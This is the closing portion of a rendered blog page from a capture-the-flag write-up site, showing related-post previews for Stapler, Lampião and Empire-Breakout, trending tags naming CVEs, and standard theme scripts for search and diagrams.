+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1720580400"
+  data-df="ll"
+  
+>
+  Jul 10, 2024
+</time>
+
+              <h4 class="pt-0 my-2">Stapler</h4>
+              <div class="text-muted">
+                <p>Stapler was an interesting box that required various skills to exploit and escalate privileges. It began with port enumeration, identifying several vulnerable services, including FTP, SSH, and SMB....</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/Proving-Grounds-Play-Lampiao/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1723690800"
+  data-df="ll"
+  
+>
+  Aug 15, 2024
+</time>
+
+              <h4 class="pt-0 my-2">Lampião</h4>
+              <div class="text-muted">
+                <p>The exploitation of the “Lampião” box involved several critical steps. First, information gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22, 80, and...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/Proving-Grounds-Play-Empire/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1723690800"
+  data-df="ll"
+  
+>
+  Aug 15, 2024
+</time>
+
+              <h4 class="pt-0 my-2">Empire-Breakout</h4>
+              <div class="text-muted">
+                <p>The exploration of the “Empire-breakout” box involved several critical steps. First, information gathering was carried out through a port scan using the nmap tool, identifying open ports such as 80...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/Proving-Gronds-Play-Stapler/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>Stapler</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/Proving-Grounds-Play-Amaterasu/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>Amaterasu</p>
+    </a>
+  
+</nav>
+
+            
+              
+              <!-- The comments switcher -->
+
+
+            
+
+            <!-- The Footer -->
+
+<footer
+  aria-label="Site Info"
+  class="d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3"
+>
+  <p>
+    © <time>2024</time>
+
+    
+    <a href="https://github.com/0xfl0k1"
+      >0xfl0k1</a
+    >.  
+    <span
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
+    >Some rights reserved.</span>
+    
+  </p>
+</footer>
+
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/easy/">EASY</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/dirty-cow/">Dirty Cow</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/insecure-file-upload/">Insecure File Upload</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/smb/">SMB</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/apport-cli-2-26-0/">apport-cli 2.26.0</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-1326/">CVE-2023-1326</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-23752/">CVE-2023-23752</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/joomla/">Joomla</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- JavaScripts -->
+    <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js,npm/mermaid@10.9.0/dist/mermaid.min.js"></script>
+
+
+
+
+
+
+
+<script src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- Pageviews -->
+
+  
+
+  
+
+
+
+  <!-- mermaid-js loader -->
+<script type="text/javascript">
+  function updateMermaid(event) {
+    if (event.source === window && event.data && event.data.direction === ModeToggle.ID) {
+      const mode = event.data.message;
+
+      if (typeof mermaid === 'undefined') {
+        return;
+      }
+
+      let expectedTheme = mode === ModeToggle.DARK_MODE ? 'dark' : 'default';
+      let config = { theme: expectedTheme };const mermaidList = document.getElementsByClassName('mermaid');
+
+      [...mermaidList].forEach((elem) => {
+        const svgCode = elem.previousSibling.children.item(0).innerHTML;
+        elem.innerHTML = svgCode;
+        elem.removeAttribute('data-processed');
+      });
+
+      mermaid.initialize(config);
+      mermaid.init(undefined, '.mermaid');
+    }
+  }
+
+  (function () {
+    let initTheme = 'default';
+    const html = document.documentElement;
+
+    if (
+      (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') ||
+      (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches)
+    ) {
+      initTheme = 'dark';
+    }
+
+    let mermaidConf = {
+      theme: initTheme};const basicList = document.getElementsByClassName('language-mermaid');
+    [...basicList].forEach((elem) => {
+      const svgCode = elem.textContent;
+      const backup = elem.parentElement;
+      backup.classList.add('d-none');let mermaid = document.createElement('pre');
+      mermaid.classList.add('mermaid');
+      const text = document.createTextNode(svgCode);
+      mermaid.appendChild(text);
+      backup.after(mermaid);
+    });
+
+    mermaid.initialize(mermaidConf);
+    window.addEventListener('message', updateMermaid);
+  })();
+</script>
+
+
+
+
+
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script>SimpleJekyllSearch({
+    searchInput: document.getElementById('search-input'),
+    resultsContainer: document.getElementById('search-results'),
+    json: '/assets/js/data/search.json',
+    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
+    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
+    templateMiddleware: function(prop, value, template) {
+      if (prop === 'categories') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+        }
+      }
+
+      if (prop === 'tags') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+        }
+      }
+    }
+  });
+</script>
+
+  </body>
+</html>
+
